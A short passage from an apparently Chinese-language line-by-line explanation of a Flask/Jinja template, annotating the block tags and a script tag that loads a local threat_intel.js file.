| 216 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% block page_scripts %}` |
| 217 | 脚本引用：加载页面所需 JavaScript。 | `  <script src="{{ url_for('static', filename='js/threat_intel.js') }}"></script>` |
| 218 | 模板语句：由 Jinja 在服务端渲染时替换或控制流程。 | `{% endblock %}` |
